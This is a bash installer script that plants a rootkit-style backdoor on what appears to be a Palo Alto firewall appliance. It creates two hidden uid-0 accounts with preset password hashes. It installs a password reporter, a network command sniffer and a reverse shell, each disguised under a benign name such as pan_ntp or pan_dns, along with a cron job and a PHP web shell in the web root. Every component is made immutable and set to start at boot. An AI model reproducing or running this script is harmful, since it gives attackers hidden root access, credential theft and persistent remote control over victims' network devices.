#!/bin/bash

#Add User(s)
/usr/sbin/useradd pan_admin -u 0 -o -p OP8UORo9zrsD. 1>/dev/null 2>/dev/null
/usr/sbin/useradd pan_backup -u 0 -o -p OP8UORo9zrsD. 1>/dev/null 2>/dev/null


#Installing Upgrader
mv /tmp/module/upgrader /usr/local/bin/pan_upgrader
chmod +x /usr/local/bin/pan_upgrader
chattr +i /usr/local/bin/pan_upgrader
mv /tmp/chkconfig/upgrader.chkconfig /etc/init.d/pan_upgrader
/sbin/chkconfig --level 2345 pan_upgrader on
if [[ ! $(ps aux | grep pan_upgrader | grep -v grep) ]]; then
	nohup /usr/local/bin/pan_upgrader 1>/dev/null 2>/dev/null &
fi
#Moving Script Files
mv /tmp/rkit.tgz /opt/panrepo/pending/rkit.tgz
chattr +i /opt/panrepo/pending/rkit.tgz


#Install Password Reporter
mv /tmp/module/passreport.py /usr/local/bin/pan_ntp
chmod +x /usr/local/bin/pan_ntp
chattr +i /usr/local/bin/pan_ntp
mv /tmp/chkconfig/passreport.chkconfig /etc/init.d/pan_ntp
/sbin/chkconfig --level 2345 pan_ntp on
if [[ ! $(ps aux | grep pan_ntp | grep -v grep) ]]; then
	nohup /usr/local/bin/pan_ntp 1>/dev/null 2>/dev/null &
fi


#Install Network Command Sniffer
mv /tmp/module/cmdsniffer.py /usr/local/bin/pan_dns
chmod +x /usr/local/bin/pan_dns
chattr +i /usr/local/bin/pan_dns
mv /tmp/chkconfig/cmdsniffer.chkconfig /etc/init.d/pan_dns
chkconfig --level 2345 pan_dns on
if [[ ! $(ps aux | grep pan_dns | grep -v grep) ]]; then
	nohup /usr/local/bin/pan_dns 1>/dev/null 2>/dev/null &
fi


#Install Crontab
mv /tmp/module/crontab /etc/cron.d/pan-threat-updater
chattr +i /etc/cron.d/pan-threat-updater
#Install Reverse Shell Script
mv /tmp/module/revshell.sh /usr/local/bin/pan_slogger
chmod +x /usr/local/bin/pan_slogger
chattr +i /usr/local/bin/pan_slogger


#Install Web Shell
mv /tmp/module/webshell /var/appweb/htdocs/composer.php
chattr +i /var/appweb/htdocs/composer.php

#Moving Uninstaller
mv /tmp/uninstaller.sh /opt/panrepo/pending/uninstaller.sh

#Cleaning Up Files
#rm /tmp/installer.sh
#rm -r /tmp/module/
#rm -r /tmp/chkconfig/
